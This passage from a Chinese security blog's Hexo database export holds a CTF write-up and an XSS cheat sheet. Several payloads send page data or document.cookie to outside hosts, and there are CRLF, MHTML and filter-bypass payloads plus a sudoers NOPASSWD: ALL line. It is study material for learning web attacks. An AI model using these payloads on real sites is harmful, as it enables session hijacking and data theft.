class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">history.pushState(<span class=\"string\">''</span>, <span class=\"string\">''</span>, <span class=\"string\">'/'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://127.0.0.1/runsql.php\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"sql\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"select 0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"><span class=\"built_in\">document</span>.forms[<span class=\"number\">0</span>].submit();</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>通过以上操作，可以发现后台有<code>admin_zzzz666.php</code>页面</p>\n<p>但是admin_zzzz666.php并无flag，只有<code>./static/img/iamsecret_555.jpg</code></p>\n<p>修改payload,也就是vps上的js文件，利用canvas获取图片:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var love=&#123;ajax:function()&#123;var a;try&#123;a=new XMLHttpRequest()&#125;catch(e)&#123;try&#123;a=new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;)&#125;catch(e)&#123;try&#123;a=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;)&#125;catch(e)&#123;return false&#125;&#125;&#125;return a&#125;,req:function(b,c,d,e)&#123;d=(d||&quot;&quot;).toUpperCase();d=d||&quot;GET&quot;;c=c||&quot;&quot;;if(b)&#123;var a=this.ajax();a.open(d,b,true);if(d==&quot;POST&quot;)&#123;a.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;)&#125;a.onreadystatechange=function()&#123;if(a.readyState==4)&#123;if(e)&#123;e(a)&#125;&#125;&#125;;if((typeof c)==&quot;object&quot;)&#123;var f=[];for(var i in c)&#123;f.push(i+&quot;=&quot;+encodeURIComponent(c[i]))&#125;a.send(f.join(&quot;&amp;&quot;))&#125;else&#123;a.send(c||null)&#125;&#125;&#125;,get:function(a,b)&#123;this.req(a,&quot;&quot;,&quot;GET&quot;,b)&#125;,post:function(a,b,c)&#123;this.req(a,b,&quot;POST&quot;,c)&#125;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">function getBase64(img)&#123;</span><br><span class=\"line\">    function getBase64Image(img,width,height) &#123;//width、height调用时传入具体像素值，控制大小 ,不传则默认图像大小</span><br><span class=\"line\">        var canvas = document.createElement(&quot;canvas&quot;);</span><br><span class=\"line\">        canvas.width = width ? width : img.width;</span><br><span class=\"line\">        canvas.height = height ? height : img.height;</span><br><span class=\"line\"></span><br><span class=\"line\">        var ctx = canvas.getContext(&quot;2d&quot;);</span><br><span class=\"line\">        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);</span><br><span class=\"line\">        var dataURL = canvas.toDataURL();</span><br><span class=\"line\">        return dataURL;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    var image = new Image();</span><br><span class=\"line\">    image.crossOrigin = &apos;&apos;;</span><br><span class=\"line\">    image.src = img;</span><br><span class=\"line\">    return new Promise((resolve,reject)=&gt;&#123;</span><br><span class=\"line\">        image.onload =function ()&#123;</span><br><span class=\"line\">            resolve(getBase64Image(image));//将base64传给done上传处理</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">getBase64(&apos;http://127.0.0.1/static/img/iamsecret_555.jpg&apos;).then(base64 =&gt; &#123;</span><br><span class=\"line\">    love.post(</span><br><span class=\"line\">      &quot;http://ip/xss/x.php&quot;,</span><br><span class=\"line\">      &quot;v=&quot;+base64,</span><br><span class=\"line\">      function(res)&#123;</span><br><span class=\"line\">        console.log(res);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    );</span><br><span class=\"line\">&#125;, err =&gt; &#123;</span><br><span class=\"line\">    console.log(err)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p>vps上xss.php:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">header(&apos;Access-Control-Allow-Origin: *&apos;);</span><br><span class=\"line\">file_put_contents(&apos;log.txt&apos;,$_POST[&apos;v&apos;]);</span><br></pre></td></tr></table></figure>\n<p>最后会获取到图片，当然这个过程中+会被转换为空格，所以后面还要转换回来。 </p>\n<h2 id=\"Dedefun\"><a href=\"#Dedefun\" class=\"headerlink\" title=\"Dedefun\"></a>Dedefun</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">参考网址：</span><br><span class=\"line\">https://paper.tuisec.win/detail/d1053143f127862</span><br><span class=\"line\">https://xz.aliyun.com/t/2469#toc-3</span><br></pre></td></tr></table></figure>\n<p><strong>主要用来找后台目录</strong></p>\n<h2 id=\"A-simple-CMS\"><a href=\"#A-simple-CMS\" class=\"headerlink\" title=\"A simple CMS\"></a>A simple CMS</h2><p><strong>利用缓存getshell</strong></p>\n<p>慢慢分析吧。挖坑</p>\n"},{"title":"普通用户免密码切换到root","date":"2018-05-29T06:44:48.000Z","_content":"\n1. sudo vim /etc/sudoers\n\n2. 添加一行:\n\n   > tiandiwuji  ALL=(ALL)       NOPASSWD: ALL\n\n","source":"_posts/普通用户免密码切换到root.md","raw":"---\ntitle: 普通用户免密码切换到root\ndate: 2018-05-29 14:44:48\ntags:\n---\n\n1. sudo vim /etc/sudoers\n\n2. 添加一行:\n\n   > tiandiwuji  ALL=(ALL)       NOPASSWD: ALL\n\n","slug":"普通用户免密码切换到root","published":1,"updated":"2018-06-30T02:04:24.526Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12iv001zqkdlqn8n5ui8","content":"<ol>\n<li><p>sudo vim /etc/sudoers</p>\n</li>\n<li><p>添加一行:</p>\n<blockquote>\n<p>tiandiwuji  ALL=(ALL)       NOPASSWD: ALL</p>\n</blockquote>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<ol>\n<li><p>sudo vim /etc/sudoers</p>\n</li>\n<li><p>添加一行:</p>\n<blockquote>\n<p>tiandiwuji  ALL=(ALL)       NOPASSWD: ALL</p>\n</blockquote>\n</li>\n</ol>\n"},{"title":"xss","date":"2018-03-27T08:27:13.000Z","_content":"link 标签引入外部 js。\n\n```javascript\n也可以用域名，将 . 用 。 代替。\n<link rel=import href=\\\\八进制ip\n```\n\n```javascript\n<script>\n  var xhr = new XMLHttpRequest();\n  xhr.open(\"GET\", \"https://router.vip/flag.php\", false);\n  xhr.send();\n  a=xhr.responseText;\n  location.href='https://master.xbfzss.cn/?a='+escape(a);\n</script>\n```\n\nxss:\njquery版本>=1.9\nsourceMappingURL加载外部资源\n<script>//# sourceMappingURL=https://xxx.com/?${escape(document.cookie)}</script>\n\n```\n<input name=keyword  value=\"<scrilpt>alert(1);</script>\">\npayload:\" onmouseover=alert(1) \"\n<input name=keyword  value=\"\" onmouseover=alert(1) \"\">\n```\n\n```\n<input name=keyword  value=''>\npayload:' onmouseover=alert(1) '\n<input name=keyword  value=' onmouseover=alert(1) ''>\n```\n\n```\n<input name=keyword  value=\"\">\n过滤了on\n<input name=keyword  value=\"\" o_nclick=alert(1) \"\">\n\npayload:\"><a href=\"javascript:alert(1)\" >as</a>\n<input name=keyword  value=\"\"><a href=\"javascript:alert(1)\" ></a>\">\n```\n```\n<input name=keyword  value=\"\">\n过滤了on\n<input name=keyword  value=\"\" o_nclick=alert(1) \"\">\n\npayload:\"><a href=\"javascript:alert(1)\" >as</a>\n<input name=keyword  value=\"\"><a href=\"javascript:alert(1)\" ></a>\">\n```\n\n空格可以使用%0a，%0d绕过\n\n= onmouseover=alert\\`1\\`\nalert(1)   两边的括号可以使用``替换\n\n```\n<html>\n<script type=\"text/javascript\">\nvar call_window;\ncall_window = window.open(\"http://localhost/call.php\");\nsetTimeout(function(){\n    call_window.postMessage({\n      type: \"audio\",\n      details: {\n      sender_username: \"<img src=xx: onerror=window.open('http://123.207.90.143/index.php?a='+document.cookie)>\",\n        sender_team_name: \"zzzz\",\n        receiver_username: \"test\",\n        receiver_team_name: \"test\"\n      }\n    }, \"*\");\n}, 1000);\n</script>\n</html>\n```\n\n## CRLF 注射攻击（HTTP ResponseSplitting）(HRS)\n\n``` .aspx\nnameValueCollection request = Request.QueryString;\nResponse.Cookies[\"username\"].Value = request[\"text\"]\n```\n\n正常访问:\n\n> http://www.test.com/demo.aspx?text=test\n\n正常情况下，会使用text=test来setcookie\n\npayload:\n\n> http://www.test.com/demo.aspx?text=a%0D%0ASet-Cookie%03A020HackedCookie=Hacked\n\n正常情况下：HTTP Response如下:\n\n> HTTP/1.1 200 OK\n>\n> Set-Cookie: userName=test\n>\n> Content-Type: text/html; charset-utf-8\n\n使用payload的情况下:\n\n> HTTP/1.1 200 OK\n>\n> Set-Cookie: username=a\n>\n> Set-Cookie: HackedCookie=Hacked\n>\n> Content-Type: text/html; charset-utf8\n\n更严重的情况下:\n\npayload:\n\n> http://www.test.com/page.php?page=%0d%0aContent-Type: text/html%0D%0AHTTP/1.1 200 OK %0D%0AContent-Type: text/html%0D%0A%0D%0A%3Chtml%3EHacker Content%3C/html%3E\n\n该代码明显恶意，但是浏览器也会执行。\n\n## MHTML协议安全[IE浏览器]\n\nMHTML协议格式:\n\n> mhtml: [Mhtml_File_Url]![Original_Resource_Url]\n\n新建一个HTML文件，demo.html\n\n```html\nContent-Type: multipart/related; boundary=\"_boundary_by_mere\"\n\n--_boundary_by_mere\nCotent-Location: demo\nContent-Transfer-Encoding: base64\n\nPHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ=\n--_boundary_by_mere--\n```\n\n当使用如下链接进行访问的时候，就会弹窗：\n\n> mhtml:http://127.0.0.1/demo.html!demo\n\n注意:为了让IE调用MHTML Protocol Handler将该资源当做MHTML格式文件解析处理，需要把URL修改为MHTML协议，在\"http\"之前加上\"mhtml:\"，在url后边加上\"!demo\"字样。\n\n此外，还可以结合CRLF漏洞实现XSS。\n\n首先PHP脚本如下(test.php):\n\n```php\n<?php\n    echo $_GET['k'];\n?>\n```\n\n构造url:\n\n> mhtml:http://127.0.0.1/test.php?k=ax%250AContent-Type%3A%20multipart%2frelated%3B%20boundary%3D%22_boundary_by_mere%22%250D%250A--_boundary_by_mere%250D%250ACotent-Location%3A%20xss%250D%250AContent-Transfer-Encoding%3A%20base64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ%3D%250D%250A--_boundary_by_mere--!xss\n\n## 利用Data URIs进行XSS\n\n该方案和MHTML有些类似。Data URI格式如下:\n\n>  data:\\[<mime type>\\]\\[;charset=<charset>\\]\\[;base64\\],<encoded data>\n\n> data指代URI协议\n>\n> mime type 代表数据类型，如PNG图片则为image/png,若无说明，默认为text/plain\n>\n> charset 如果不适用base64，则使用charset指定的字符类型\n>\n> encoded data 对应的编码信息\n\n例如:\n\n```html\n<img src=\"data:image/gif;base64,R0lGODlhMwAxAIAAAAAAAP///\nyH5BAAAAAAALAAAAAAzADEAAAK8jI+pBr0PowytzotTtbm/DTqQ6C3hGX\nElcraA9jIr66ozVpM3nseUvYP1UEHF0FUUHkNJxhLZfEJNvol06tzwrgd\nLbXsFZYmSMPnHLB+zNJFbq15+SOf50+6rG7lKOjwV1ibGdhHYRVYVJ9Wn\nk2HWtLdIWMSH9lfyODZoZTb4xdnpxQSEF9oyOWIqp6gaI9pI1Qo7BijbF\nZkoaAtEeiiLeKn72xM7vMZofJy8zJys2UxsCT3kO229LH1tXAAAOw==\">\n```\n\nXSS隐患，执行XSS最常用的方法是引入<script>标签，如果过滤，就没有办法使用了。\n\n> \\<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"\\>test\\</a\\>\n\n其中:\n\n> PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\n\n解码后:\n\n> \\<script\\>alert('xss');\\</script\\>\n\n这种方法，现在不支持，同样不支持的还有<meta>标签，  chrome和firefox都会禁止。  \n\n>  <meta http-equiv=\"Refresh\" content=\"0; URL=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\">\n\n<object>则可以使用,<iframe>也行。\n\n> <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></object>\n>\n> <iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></iframe>\n\n## simple xss\n\nXSS payload只允许使用大小写字母数字加上`<^*~\\-|_=+`这些特殊符号，那么大概只有两种方案：\n\n1. 利用onload=A=B 可以作一句给A(通常是location)赋值B的简单js赋值操作\n2. 利用某些奇怪的HTML标签特性\n\n比赛时感觉方向1行不通，于是我走了方向2的思路。但方向1还真让某`LC↯BC`队<https://ctftime.org/writeup/5956> 脑洞出来了个奇葩思路\n\n><svg id=\\ onload=location=id+id+12345609861+domain+id+1234+id \n\n我们（nao）想（dong）出来的payload有如下几个关键点：\n\n1. Chrome会把域名中的`。`（全角句号）理解成`.`\n2. `<link rel=import`这种标签会把html import到当前页面里....N年前玩polymer的时候常用的一种标签...这里不能用script标签，因为script标签没有正常闭合时引用的js貌似不会被执行\n3. `\\\\`会被Chrome理解成`//`，`\\`也会理解成`/` （其实这里有个小插曲，我Win10上的Chrome会把`\\\\`理解成windows资源管理器里敲的那种`\\\\`也就是samba协议(或`file://`伪协议)...所以这种payload XSS Windows貌似是不行...?）， 因此`\\\\example。com\\xssHtml`会变成`//example.com/xssHtml`\n\n综上，payload:\n\n> <link rel=import href=\\\\example。com\\xssHtml other= \n\n## RSS中的XSS\n\n略\n\n## 浏览器差异\n\n```html\n<script type=\"text/javascript\"><!--\n    var x = \"xssed</script x\\><script x\\>alert(/xss/);//\";\n//--></script>\n```\n\nChrome会动态修正一些节点，如将</script x\\>修正为</script>，由于该特性只是按照标签配对，没有考虑HTML注释或其他复杂情况，会导致xss.\n\n## img编码绕过\n\n```html\n<img src=\"\" onerror=\"j&#00097vascript:alert('xss');\">\n<img src=\"\" onerror=\"j&#97vascript:alert('xss1');\">\n<img src=\"\" onerror=\" javascript:alert('xss3');\">\n```\n\n## a绕过,javascript伪协议\n\n```\n\"><a href=\"javascript:alert(1)\">click me</a><\"\n```\n\n## body和div\n\n```\n\"><body onload=alert(1)><\"\n\"><div onclick=\"alert('xss')\">click me<\"\n```\n\n## 过滤括号\n\n```php\n<?php \n    ini_set(\"display_errors\", 0); \n\t$str = strtolower(@$_POST[\"keyword\"]); \n\twhile (strpos($str,'script')) {$str = str_replace('script', '', $str);} \n\t$str = str_replace('(', '', $str); \n\t$str = str_replace(')', '', $str); \n\techo ' <form class=\"main\" action=\"index.php\" method=\"POST\"> <input name=keyword size=60 value=\"'.$str.'\"> <input type=submit name=submit value=\"Search\"/> </form>'; echo '<p class=\"main\">No results for \"<b>'.htmlspecialchars($str).'</b>\"</p>'; ?>\n```\n\n```\n\"><body onload=alert`1`><\"\n\" onfocus=alert`1` \"\n```\n\n## 过滤`',\",' '   `\n\n有时候用斜杠是可以代替空格的\n\n```\n<?php \n    ini_set(\"display_errors\", 0); \n\t$str = strtolower(@$_POST[\"keyword\"]); \n\twhile (strpos($str,'script')) {$str = str_replace('script', '', $str);} \n\t$str = str_replace('(', '', $str); \n\t$str = str_replace(')', '', $str); \n\t$str = str_replace(' ', '', $str); \n\techo ' <form class=\"main\" action=\"index.php\" method=\"POST\"> <input name=keyword size=60 value=\"'.$str.'\"> <input type=submit name=submit value=\"Search\"/> </form>'; echo '<p class=\"main\">No results for \"<b>'.htmlspecialchars($str).'</b>\"</p>'; ?\n```\n\n```\n\"/onfocus=alert`1`/\"\n\"><img/src='1'/onerror=alert`0`><\"\n\"><<svg/onload=alert`1`><\"\n```\n\n## 过滤尖括号里边的所有东西\n\n```\n<?php \n    ini_set(\"display_errors\", 0); \n\t$str = strtolower(@$_POST[\"keyword\"]); \n\t$str = preg_replace(\"/<.*?>/\", '', $str);\n\techo ' <form class=\"main\" action=\"index.php\" method=\"POST\"> <input name=keyword size=60 value=\"'.$str.'\"> <input type=submit name=submit value=\"Search\"/> </form>'; echo '<p class=\"main\">No results for \"<b>'.htmlspecialchars($str).'</b>\"</p>'; ?\n```\n\n```\n\" type=image src=x onerror=alert(1) \"\n=> <input type=image src=x onerror=alert(1)>\ninput会被当做img标签使用\n\n\"/onfocus=alert`1`/\"             => 不会自动触发\n```\n\n## js中的连接符\n\n```\n <?php \n \tini_set(\"display_errors\", 0); \n \t$name = $_GET[\"name\"]; \n \techo '<h3 class=\"main\">No results for \"<b>'; echo htmlspecialchars($name).'</b>\"</h3>'; echo ' <script> var t=\"'.$name.'\"; var s=\"xxxxxxxx\"; var d=\"dddd\"; </script>'; ?> \n```\n\n```\n这里就是一个新的输出点了，你的值是输出在js代码中的 只要闭合双引号，然后就可以写你自己的js代码了 比如 \"-alert(1)-\" 赋值给url中的name即可 -是js中的连接符号\n\n\nname=\";alert(1);//\n```\n\n##  危险字符\n\n| <    | &lt          |\n| ---- | ------------ |\n| >    | ```&gt;```   |\n| &    | ```&amp;```  |\n| \"    | ```&quot;``` |\n| '    | ```&#39```   |\n\n## Dom-Based XSS\n\n> document.URL\n>\n> document.URLUencoded\n>\n> document.location(.pathname|.href|.search|.hash)\n>\n> window.location(.pathname|.href|.search|.hash)\n>\n> document.referrer\n>\n> window.name\n>\n> document.cookie\n>\n> HTML5 postMessage\n>\n> localStorage/globalStorage\n>\n> XMLHTTPRequest response\n>\n> Input.value\n\n## htmlspecialchars可绕过情况\n\n```\necho \"<input type=\\\"text\\\" value='\" + htmlspecialchars($str) + \"'>Please input the t1 as parameter\";\n```\n\n```\n$str = ' onmouseover=alert(1) > //\n```\n\n因为htmlspecialchars默认只过滤`<`，`>`, `\"`，`&`,默认为`ENT_COMPAT`\n\n```\nENT_COMPAT - 默认。仅编码双引号。\nENT_QUOTES - 编码双引号和单引号。\nENT_NOQUOTES - 不编码任何引号。\n```\n\n## addslashes\n\n```\necho \"<input type=\\\"text\\\" value='\" + addslashes($str) +\"'>Please input the t1 as parameter\";\n```\n\npaylaod1:\n\n```\n$str = ' onmouseover=alert(1) //\n=> 源码:\n<input type=\"text\" value='\\' onmouseover=alert(1) //'>Please input the t2 as parameter\n=> 浏览器处理结果:\n<input value=\"\\\" onmouseover=\"alert(1)//'\" type=\"text\">\n```\n\n在火狐里边也能触发，如果去掉 `//` 则无法触发，应该是`//` 注释掉了后边的单引号，浏览器处理出现问题\n\n如果使用以上 payload,浏览器最终结果:\n\n```\n<input value=\"\\\" onmouseover=\"alert(1)//'\" type=\"text\">\n```\n\n如果去掉`//`\n\n```\n$str = ' onmouseover=alert(1) //\n=> 源码:\n<input type=\"text\" value='\\' onmouseover=alert(1)'>Please input the t2 as parameter\n=> 浏览器处理结果：\n<input type=\"text\" value='\\' onmouseover=alert(1)'>Please input the t2 as parameter\n```\n\n这时候，就无法触发alert。\n\npaylaod2: \n\n这个payload只能在编码为gbk的情况下才能使用。\n\n```\n<meta charset=\"gbk\">\n```\n\n```\n %df'><script>alert(1)</script> //\n```\n\n## strip_tags绕过\n\n```\necho '<input type=\"text\" value=\"' + strip_tags($str) +'\">Please input the t1 as parameter';\n```\n\npayload:\n\n```\n\" onmouseover=alert(1) //\n```\n\n","source":"_posts/xss.md","raw":"---\ntitle: xss\ndate: 2018-03-27 16:27:13\ntags:\n---\nlink 标签引入外部 js。\n\n```javascript\n也可以用域名，将 . 用 。 代替。\n<link rel=import href=\\\\八进制ip\n```\n\n```javascript\n<script>\n  var xhr = new XMLHttpRequest();\n  xhr.open(\"GET\", \"https://router.vip/flag.php\", false);\n  xhr.send();\n  a=xhr.responseText;\n  location.href='https://master.xbfzss.cn/?a='+escape(a);\n</script>\n```\n\nxss:\njquery版本>=1.9\nsourceMappingURL加载外部资源\n<script>//# sourceMappingURL=https://xxx.com/?${escape(document.cookie)}</script>\n\n```\n<input name=keyword  value=\"<scrilpt>alert(1);</script>\">\npayload:\" onmouseover=alert(1) \"\n<input name=keyword  value=\"\" onmouseover=alert(1) \"\">\n```\n\n```\n<input name=keyword  value=''>\npayload:' onmouseover=alert(1) '\n<input name=keyword  value=' onmouseover=alert(1) ''>\n```\n\n```\n<input name=keyword  value=\"\">\n过滤了on\n<input name=keyword  value=\"\" o_nclick=alert(1) \"\">\n\npayload:\"><a href=\"javascript:alert(1)\" >as</a>\n<input name=keyword  value=\"\"><a href=\"javascript:alert(1)\" ></a>\">\n```\n```\n<input name=keyword  value=\"\">\n过滤了on\n<input name=keyword  value=\"\" o_nclick=alert(1) \"\">\n\npayload:\"><a href=\"javascript:alert(1)\" >as</a>\n<input name=keyword  value=\"\"><a href=\"javascript:alert(1)\" ></a>\">\n```\n\n空格可以使用%0a，%0d绕过\n\n= onmouseover=alert\\`1\\`\nalert(1)   两边的括号可以使用``替换\n\n```\n<html>\n<script type=\"text/javascript\">\nvar call_window;\ncall_window = window.open(\"http://localhost/call.php\");\nsetTimeout(function(){\n    call_window.postMessage({\n      type: \"audio\",\n      details: {\n      sender_username: \"<img src=xx: onerror=window.open('http://123.207.90.143/index.php?a='+document.cookie)>\",\n        sender_team_name: \"zzzz\",\n        receiver_username: \"test\",\n        receiver_team_name: \"test\"\n      }\n    }, \"*\");\n}, 1000);\n</script>\n</html>\n```\n\n## CRLF 注射攻击（HTTP ResponseSplitting）(HRS)\n\n``` .aspx\nnameValueCollection request = Request.QueryString;\nResponse.Cookies[\"username\"].Value = request[\"text\"]\n```\n\n正常访问:\n\n> http://www.test.com/demo.aspx?text=test\n\n正常情况下，会使用text=test来setcookie\n\npayload:\n\n> http://www.test.com/demo.aspx?text=a%0D%0ASet-Cookie%03A020HackedCookie=Hacked\n\n正常情况下：HTTP Response如下:\n\n> HTTP/1.1 200 OK\n>\n> Set-Cookie: userName=test\n>\n> Content-Type: text/html; charset-utf-8\n\n使用payload的情况下:\n\n> HTTP/1.1 200 OK\n>\n> Set-Cookie: username=a\n>\n> Set-Cookie: HackedCookie=Hacked\n>\n> Content-Type: text/html; charset-utf8\n\n更严重的情况下:\n\npayload:\n\n> http://www.test.com/page.php?page=%0d%0aContent-Type: text/html%0D%0AHTTP/1.1 200 OK %0D%0AContent-Type: text/html%0D%0A%0D%0A%3Chtml%3EHacker Content%3C/html%3E\n\n该代码明显恶意，但是浏览器也会执行。\n\n## MHTML协议安全[IE浏览器]\n\nMHTML协议格式:\n\n> mhtml: [Mhtml_File_Url]![Original_Resource_Url]\n\n新建一个HTML文件，demo.html\n\n```html\nContent-Type: multipart/related; boundary=\"_boundary_by_mere\"\n\n--_boundary_by_mere\nCotent-Location: demo\nContent-Transfer-Encoding: base64\n\nPHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ=\n--_boundary_by_mere--\n```\n\n当使用如下链接进行访问的时候，就会弹窗：\n\n> mhtml:http://127.0.0.1/demo.html!demo\n\n注意:为了让IE调用MHTML Protocol Handler将该资源当做MHTML格式文件解析处理，需要把URL修改为MHTML协议，在\"http\"之前加上\"mhtml:\"，在url后边加上\"!demo\"字样。\n\n此外，还可以结合CRLF漏洞实现XSS。\n\n首先PHP脚本如下(test.php):\n\n```php\n<?php\n    echo $_GET['k'];\n?>\n```\n\n构造url:\n\n> mhtml:http://127.0.0.1/test.php?k=ax%250AContent-Type%3A%20multipart%2frelated%3B%20boundary%3D%22_boundary_by_mere%22%250D%250A--_boundary_by_mere%250D%250ACotent-Location%3A%20xss%250D%250AContent-Transfer-Encoding%3A%20base64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ%3D%250D%250A--_boundary_by_mere--!xss\n\n## 利用Data URIs进行XSS\n\n该方案和MHTML有些类似。Data URI格式如下:\n\n>  data:\\[<mime type>\\]\\[;charset=<charset>\\]\\[;base64\\],<encoded data>\n\n> data指代URI协议\n>\n> mime type 代表数据类型，如PNG图片则为image/png,若无说明，默认为text/plain\n>\n> charset 如果不适用base64，则使用charset指定的字符类型\n>\n> encoded data 对应的编码信息\n\n例如:\n\n```html\n<img src=\"data:image/gif;base64,R0lGODlhMwAxAIAAAAAAAP///\nyH5BAAAAAAALAAAAAAzADEAAAK8jI+pBr0PowytzotTtbm/DTqQ6C3hGX\nElcraA9jIr66ozVpM3nseUvYP1UEHF0FUUHkNJxhLZfEJNvol06tzwrgd\nLbXsFZYmSMPnHLB+zNJFbq15+SOf50+6rG7lKOjwV1ibGdhHYRVYVJ9Wn\nk2HWtLdIWMSH9lfyODZoZTb4xdnpxQSEF9oyOWIqp6gaI9pI1Qo7BijbF\nZkoaAtEeiiLeKn72xM7vMZofJy8zJys2UxsCT3kO229LH1tXAAAOw==\">\n```\n\nXSS隐患，执行XSS最常用的方法是引入<script>标签，如果过滤，就没有办法使用了。\n\n> \\<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"\\>test\\</a\\>\n\n其中:\n\n> PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\n\n解码后:\n\n> \\<script\\>alert('xss');\\</script\\>\n\n这种方法，现在不支持，同样不支持的还有<meta>标签，  chrome和firefox都会禁止。  \n\n>  <meta http-equiv=\"Refresh\" content=\"0; URL=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\">\n\n<object>则可以使用,<iframe>也行。\n\n> <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></object>\n>\n> <iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></iframe>\n\n## simple xss\n\nXSS payload只允许使用大小写字母数字加上`<^*~\\-|_=+`这些特殊符号，那么大概只有两种方案：\n\n1. 利用onload=A=B 可以作一句给A(通常是location)赋值B的简单js赋值操作\n2. 利用某些奇怪的HTML标签特性\n\n比赛时感觉方向1行不通，于是我走了方向2的思路。但方向1还真让某`LC↯BC`队<https://ctftime.org/writeup/5956> 脑洞出来了个奇葩思路\n\n><svg id=\\ onload=location=id+id+12345609861+domain+id+1234+id \n\n我们（nao）想（dong）出来的payload有如下几个关键点：\n\n1. Chrome会把域名中的`。`（全角句号）理解成`.`\n2. `<link rel=import`这种标签会把html import到当前页面里....N年前玩polymer的时候常用的一种标签...这里不能用script标签，因为script标签没有正常闭合时引用的js貌似不会被执行\n3. `\\\\`会被Chrome理解成`//`，`\\`也会理解成`/` （其实这里有个小插曲，我Win10上的Chrome会把`\\\\`理解成windows资源管理器里敲的那种`\\\\`也就是samba协议(或`file://`伪协议)...所以这种payload XSS Windows貌似是不行...?）， 因此`\\\\example。com\\xssHtml`会变成`//example.com/xssHtml`\n\n综上，payload:\n\n> <link rel=import href=\\\\example。com\\xssHtml other= \n\n## RSS中的XSS\n\n略\n\n## 浏览器差异\n\n```html\n<script type=\"text/javascript\"><!--\n    var x = \"xssed</script x\\><script x\\>alert(/xss/);//\";\n//--></script>\n```\n\nChrome会动态修正一些节点，如将</script 